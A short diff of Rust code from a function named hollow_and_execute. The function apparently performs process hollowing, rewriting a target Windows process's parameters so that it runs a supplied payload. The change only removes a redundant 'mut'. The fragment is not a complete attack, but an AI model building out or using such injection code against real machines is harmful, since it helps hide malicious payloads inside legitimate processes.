@@ -1163,7 +1163,7 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                                     "hollow_and_execute: failed to write validated ProcessParameters path buffer"
                                 );
                             } else {
-                                let mut new_us = winapi::shared::ntdef::UNICODE_STRING {
+                                let new_us = winapi::shared::ntdef::UNICODE_STRING {
                                     Length: path_len_bytes as u16,
                                     MaximumLength: full_len_bytes as u16,
                                     Buffer: target_buf,
